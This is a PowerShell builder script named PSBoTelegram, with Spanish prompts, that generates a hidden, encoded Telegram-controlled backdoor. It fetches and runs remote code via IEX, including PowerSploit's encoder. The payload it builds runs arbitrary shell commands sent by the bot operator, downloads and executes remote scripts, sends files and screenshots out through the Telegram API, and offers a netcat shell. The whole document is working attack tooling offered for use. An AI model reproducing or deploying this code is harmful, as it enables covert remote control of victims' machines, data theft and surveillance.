clear
$ErrorActionPreference = "SilentlyContinue"
$version = "0.2"

$banner = "    ____  _____ ____      ______     __                              
   / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
  / /_/ /\__ \/ __  / __ \/ / / _ \/ / _ \/ __  / ___/ __  / __  __ \
 / ____/___/ / /_/ / /_/ / / /  __/ /  __/ /_/ / /  / /_/ / / / / / /
/_/    /____/_____/\____/_/  \___/_/\___/\__, /_/   \__,_/_/ /_/ /_/ 
                                        /____/                       "





Write-Host $banner -ForegroundColor Green ; Write-Host "`n                                                     v$version by CyberVaca @ Luis Vacas" -ForegroundColor red

Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el delay para la conexión: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host

Function check-command
{
 Param ($command)
 $antigua_config = $ErrorActionPreference
 $ErrorActionPreference = "stop"
 try {if(Get-Command $command){RETURN $true}}
 Catch { RETURN $false}
 Finally {$ErrorActionPreference=$antigua_config}
 }
if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
$scriptblock = {
param (
[string]$botkey = "your_token",
[string]$bot_Master_ID = "your_chat_id",
[int]$delay = "your_delay"
)
IEX (Invoke-WebRequest "https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Functions.ps1").content
$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ; $bot = [string]$bot[3] ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" 
[int]$first_connect = "1"
$help = "PSBoTelegram V0.2`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot"
while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
    $l = $json.result.length
	$i = 0
if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
	while ($i -lt $l) {
		$offset = $json.result[$i].update_id + 1
        $comando = $json.result[$i].message.text
Write-Host "$comando"

 if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
 if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat $chat_id}
 if ($comando -like "/Download") {$file = $comando -replace "/Download " ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
 if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}

   		$i++
	}

if ($kill -eq "$true" -and $first_connect -gt 5) {break}
	Start-Sleep -s $delay ;$first_connect++ 
}
}
$scriptblock | Out-File bot.ps1
$scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay" | Out-File bot.ps1
Out-EncodedCommand -Path bot.ps1 -NoProfile -NonInteractive -WindowStyle Hidden -EncodedOutput ; Remove-Item bot.ps1

Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Código listo para ejecutarse. `n`n`n" -ForegroundColor Green -NoNewline 
pause
